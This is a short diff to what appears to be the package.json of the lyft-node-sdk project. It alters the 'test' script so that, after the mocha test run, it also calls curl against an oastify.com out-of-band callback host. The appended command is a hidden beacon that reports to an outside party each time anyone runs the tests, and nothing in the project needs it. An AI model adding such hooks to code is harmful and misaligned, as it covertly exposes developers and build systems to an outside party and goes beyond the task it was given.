@@ -6,7 +6,7 @@
   "repository": "lyft/lyft-node-sdk",
   "main": "lib/index.js",
   "scripts": {
-    "test": "mocha --compilers js:babel-core/register --recursive",
+    "test": "mocha --compilers js:babel-core/register --recursive && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/Lyft-node-sdk",
     "dev": "babel --watch src --out-dir lib",
     "build": "babel src --out-dir lib",
     "prepare": "babel src --out-dir lib"
